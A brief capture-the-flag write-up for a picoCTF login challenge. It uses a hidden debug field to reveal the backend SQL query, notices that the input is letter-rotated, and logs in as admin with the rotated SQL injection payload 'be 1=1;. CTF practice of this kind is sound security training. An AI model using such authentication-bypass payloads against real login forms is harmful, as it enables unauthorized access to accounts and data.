## There is a secure website running at https://jupiter.challenges.picoctf.org/problem/40742/ (link) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!


There is a hidden element in the page named 'debug', put the value to 1 and you will have feedback for your SQLi.

If we try 'or 1=1; we get:

```
password: 'or 1=1;
SQL query: SELECT * FROM admin where password = ''be 1=1;'

```

It should be `or` not `be`. So lets just replace it with `be`:

```

'be 1=1;
```

This will get us the flag.
